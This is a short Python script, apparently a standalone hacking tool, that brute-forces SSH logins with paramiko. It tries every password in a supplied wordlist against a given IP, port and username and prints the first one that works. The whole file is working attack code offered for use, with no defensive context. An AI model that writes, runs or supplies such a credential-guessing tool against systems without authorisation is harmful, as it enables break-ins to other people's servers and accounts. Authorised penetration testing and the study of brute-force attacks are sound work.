import paramiko
import argparse
import threading

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', dest = 'ip', help = 'IP Address')
    parser.add_argument('-p', '--port', dest = 'port', help = 'the port on which the SS is running ')
    parser.add_argument('-u', '--username', dest = 'username', help = 'username')
    parser.add_argument('-w', '--wordlist', dest = 'wordlist', help = 'wordlist with passwords')
    options = parser.parse_args()

    if not options.ip:
        parser.error("[-] Please specify a ip, use --help for more info.' ")

    if not options.port:
        parser.error("[-] Please specify a port, use --help for more info.' ")

    if not options.username:
        parser.error("[-] Please specify a username, use --help for more info.' ")

    if not options.wordlist:
        parser.error("[-] Please specify a wordlist, use --help for more info.' ")

    return options

def ssh_connect(host, port, username, password, code=0):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=host, username=username, password=password, port=port)
    
    except paramiko.AuthenticationException:
        code = 1
    
    client.close()
    return code

def get_words(wordlist):
    wordlist_file = open(wordlist).read()
    wordlist = wordlist_file.splitlines()
    return wordlist

def brute_ssh(host, port, username, wordlist):
    for password in wordlist:
        try:
            response = ssh_connect(host, port, username, password)

            if response == 0:
                print(f"Password found: {password}")
                break

            elif response == 1:
                continue

        except Exception as e:
            print(e)
        pass

def main():
    command_args = get_args()
    words = get_words(command_args.wordlist)
    print("Bruteforcing.........")
    brute_ssh(command_args.ip, command_args.port, command_args.username, words)

main()